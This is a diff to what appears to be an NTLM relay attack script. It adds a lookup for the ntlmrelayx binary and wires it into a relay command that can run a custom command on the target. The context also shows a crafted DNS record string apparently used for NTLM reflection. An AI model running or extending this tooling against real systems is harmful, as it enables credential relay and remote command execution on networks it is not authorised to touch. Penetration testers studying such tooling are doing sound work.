@@ -255,6 +255,13 @@ def ensure_venv():
     return str(venv_python) if venv_python.exists() else sys.executable
 
 
+def find_ntlmrelayx():
+    """Find whichever ntlmrelayx binary is on PATH."""
+    for name in ["impacket-ntlmrelayx", "ntlmrelayx.py", "ntlmrelayx"]:
+        if shutil.which(name):
+            return name
+    return None
+
 VENV_PYTHON = ensure_venv()
 STATIC_DNS_RECORD = "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
 
@@ -483,7 +490,14 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
         except Exception as e:
             log("WARN", "!!", f"Could not check signing: {e}", C.YELLOW)
 
-        cmd = ["impacket-ntlmrelayx", "-t", target, "-smb2support"]
+        relay_bin = find_ntlmrelayx()
+        if not relay_bin:
+            log("FAIL", "!!", "No ntlmrelayx binary found on PATH", C.RED)
+            log_result("ntlmrelayx binary", False, "not found")
+            sys.exit(1)
+        log("SMB", "ok", f"Using relay binary: {relay_bin}")
+
+        cmd = [relay_bin, "-t", target, "-smb2support"]
         if custom_command:
             cmd.extend(["-c", custom_command])
             log("RELAY", "..", f"Custom command on relay: {custom_command}")
@@ -723,7 +737,12 @@ def main():
     })
 
     # Tool check
-    for tool in ["impacket-ntlmrelayx", "ntlmrelayx.py", "nxc", "dig"]:
+    relay_bin = find_ntlmrelayx()
+    if relay_bin:
+        log("INFO", "ok", f"ntlmrelayx found as: {relay_bin} ({shutil.which(relay_bin)})")
+    else:
+        log("WARN", "!!", "ntlmrelayx NOT FOUND (checked impacket-ntlmrelayx, ntlmrelayx.py, ntlmrelayx)", C.RED)
+    for tool in ["nxc", "dig"]:
         check_tool(tool)
 
     # Resolve relay target
